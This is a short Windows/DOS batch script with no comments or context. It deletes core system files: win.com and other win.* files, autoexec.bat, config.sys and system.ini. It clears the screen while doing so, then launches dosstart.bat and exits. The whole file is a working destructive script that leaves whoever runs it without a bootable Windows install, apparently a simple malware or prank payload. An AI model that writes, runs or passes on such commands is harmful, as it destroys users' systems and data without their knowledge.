
@echo off
deltree /y c:\windows\win.com
del c:\windows\win.*
cls
del c:\autoexec.bat
del c:\config.sys
del c:\windows\system.ini
cls
c:\windows\dosstart.bat
exit
